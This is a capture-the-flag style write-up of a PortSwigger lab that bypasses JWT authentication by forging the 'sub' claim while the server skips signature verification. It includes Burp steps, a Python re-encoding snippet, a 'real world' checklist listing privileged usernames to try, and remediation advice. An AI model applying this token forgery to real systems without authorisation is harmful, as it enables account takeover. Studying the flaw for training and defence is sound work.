# JWT Authentication Bypass via Unverified Signature

**Platform:** PortSwigger Web Security Academy

**Category:** JWT / Authentication

**Difficulty:** Apprentice

**Date Solved:** 2026-09-23

**Severity:** Critical

## Summary

The server accepts JWT tokens without verifying the signature. By modifying the `sub` claim in the JWT payload from `wiener` to `administrator` and keeping the original signature intact, the server grants administrator access. No key, no secret, no cryptography needed — the signature check simply doesn't happen.

## Key Concept: admin vs administrator

These are two different things:
```
/admin           → URL path to the admin panel (always this path)
sub: "administrator" → the username stored in the JWT payload
```

The server checks the `sub` claim to identify who you are. `/admin` is just the page. Always check your own JWT first to see what format your username is in — `sub: "wiener"` tells you the admin is likely `sub: "administrator"`.

## How JWT Works (and Why This Breaks)

A JWT has 3 parts separated by dots:
```
header.payload.signature
eyJhbG...[header].eyJpc3...[payload].SflKxw...[signature]
```

The signature is supposed to prove the payload hasn't been tampered with. When a server doesn't verify it, you can change anything in the payload and the server blindly trusts it.

## Steps to Reproduce

1. Log in as `wiener:peter` → intercept any authenticated request in Burp
2. Send to Repeater → click **JSON Web Token** tab
3. Note the payload: `{"iss":"portswigger","exp":...,"sub":"wiener"}`
4. Change `"sub": "wiener"` to `"sub": "administrator"`
5. Encode the new payload (URL-safe base64, no padding):

```bash
python3 -c "
import base64, json
payload = {'iss': 'portswigger', 'exp': 1790140891, 'sub': 'administrator'}
encoded = base64.urlsafe_b64encode(json.dumps(payload, separators=(',',':')).encode()).decode().rstrip('=')
print(encoded)
"
```

6. In Burp Repeater **Raw** tab — replace only the middle section of the JWT (between the two dots) with the new encoded payload. Keep header and signature exactly the same.
7. Send request to `/my-account?id=administrator` → response shows `Your username is: administrator`
8. Inject the modified JWT cookie into the browser (F12 → Application → Cookies → replace session value)
9. Navigate to `/admin` → delete carlos 

## Proof of Concept

**Modified JWT payload:**
```json
{"iss":"portswigger","exp":1790140891,"sub":"administrator"}
```

**Repeater response:**
```
Your username is: administrator
Your email is: admin@normal-user.net
Admin panel visible in nav
```

<img width="1913" height="1053" alt="image" src="https://github.com/user-attachments/assets/494c8dd4-6c8a-416d-94b2-3bf5db6fe4cd" />

## Root Cause

```
Expected: server verifies signature before trusting payload
Actual:   server decodes payload and uses it without signature check
Gap:      JWT validation is incomplete — decode without verify
```

## Real World Application

```
1. Log in → capture JWT in Cookie or Authorization header
2. Decode middle part (base64) → read payload
3. Change sub/role/email to privileged value
4. Re-encode payload (URL-safe base64, strip = padding)
5. Replace middle section, keep header and signature
6. Send → if server accepts → unverified signature confirmed
```

Always try: `administrator`, `admin`, `root`, `superuser`, `system`

## Methodology Entry

```
### JWT Unverified Signature
WHERE:  any JWT in Cookie or Authorization header
WHAT:   decode payload → change sub to "administrator"
        re-encode → replace middle JWT section → keep sig
SIGNAL: server returns admin content without signature error
NOTE:   /admin = URL path, sub="administrator" = username claim
```

## Remediation

1. Always verify JWT signatures server-side before trusting any claim
2. Use battle-tested JWT libraries — never implement JWT validation manually
3. Reject tokens with invalid or missing signatures with 401

**Tags:** `#JWT` `#Authentication` `#Apprentice` `#PortSwigger` `#TokenManipulation`
